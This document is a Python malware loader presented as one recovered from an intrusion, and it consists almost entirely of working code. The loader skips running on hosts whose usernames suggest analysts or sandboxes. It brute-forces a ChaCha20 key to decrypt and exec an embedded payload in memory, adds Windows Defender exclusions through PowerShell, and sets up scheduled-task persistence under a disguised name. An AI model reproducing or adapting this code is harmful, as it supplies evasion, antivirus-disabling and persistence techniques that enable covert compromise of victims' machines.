# Stage-1 loader recovered from the "survive the analyst" intrusion.
# Decrypts an embedded code object and runs it entirely in memory.
import os, sys, getpass, marshal, struct, subprocess
from Crypto.Cipher import ChaCha20

# --- analyst / sandbox gate: refuse to detonate for known researcher hosts ---
_BLOCK = ("john", "sandbox", "analyst", "malware", "virus",
          "test", "sample", "cuckoo", "wilbert", "johnson",
          "miller", "emily", "default")

def _guarded():
    u = getpass.getuser().lower()
    for bad in _BLOCK:
        if bad in u:
            return True
    return False

# --- brute-forced ChaCha20 key: the key is never stored, only its search ---
# The correct integer decrypts the first block to the CPython 3.12 marshal
# header, so the loader recomputes it every run (or reads a cached copy).
_SALT  = bytes.fromhex("0c5c8ed1bf5045868ccb573a18a5c6a61a0c5c92847a9beb")
_NONCE = bytes.fromhex("fb3ba93aaf431aacd1404389")
_KNOWN = bytes.fromhex("e30000000000000000000000001100000000000001")
_CACHE = os.path.join(os.path.dirname(sys.executable), "ExKQc.lhf")

def _derive_key(head):
    if os.path.exists(_CACHE):
        return open(_CACHE, "rb").read()
    f = 99999999
    while f >= 0:
        cand = (b"%08d" % f) + _SALT
        block = ChaCha20.new(key=cand, nonce=_NONCE).encrypt(head[:21])
        if block == _KNOWN:
            open(_CACHE, "wb").write(cand)
            return cand
        f -= 1
    raise SystemExit(0)

def _run(blob):
    key = _derive_key(blob)
    clear = ChaCha20.new(key=key, nonce=_NONCE).decrypt(blob)
    code = marshal.loads(clear)
    exec(code, {"__name__": "pe_loader_x64"})

# --- disable Defender for our staging directory before detonation ---
def _blind():
    inst = os.path.dirname(sys.executable)
    subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                    "-Command",
                    "Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue; "
                    "Add-MpPreference -ExclusionProcess 'pythonw.exe' -ErrorAction SilentlyContinue" % inst],
                   creationflags=0x08000000)

# --- scheduled-task persistence from a disguised temp XML ---
def _persist():
    xml = os.path.join(os.environ["TEMP"], "begvivn.mgk")
    subprocess.run(["schtasks", "/Create", "/F", "/TN", "MultiUpdater",
                    "/XML", xml], creationflags=0x08000000)

if __name__ == "__main__":
    if _guarded():
        sys.exit(0)
    _blind()
    _persist()
    with open(sys.argv[0], "rb") as fh:
        fh.seek(4096)
        _run(fh.read())
